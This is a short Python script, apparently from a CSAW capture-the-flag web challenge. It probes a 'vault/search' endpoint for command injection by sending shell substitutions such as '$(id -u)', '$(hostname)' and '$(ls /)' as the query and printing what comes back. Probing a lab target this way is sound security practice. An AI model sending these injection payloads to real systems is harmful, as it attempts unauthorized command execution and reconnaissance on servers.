import requests
B='http://web.chal.csaw.io:3700/vault/search'
def q(term):
    r = requests.get(B, params={'q': term}, timeout=20)
    try:
        return r.json()
    except Exception:
        return {'raw': r.text[:300], 'status': r.status_code}

# Test if $(id) output "uid=..." is used as a regex; uid=... contains '=' etc.
# If output used as regex, 'uid=0(root) gid=0(root) groups=0(root)' should match lines containing 'uid' etc.
# Alternative: output is passed through shell again? Test $(echo $(echo archive)).
tests = [
  '$(echo $(echo archive))',   # nested substitution
  '$(echo archive)',           # control
  '$(id -u)',
  '$(id -un)',
  '$(hostname)',
  '$(uname)',
  '$(ls /app)',
  '$(ls -a /app)',
  '$(ls /)',
]
for t in tests:
    d = q(t)
    if 'results' in d:
        print(f"{t!r}: {len(d['results'])}")
        for r in d['results'][:3]:
            print('    ', r[:100])
    else:
        print(f"{t!r}: {d}")
EOF
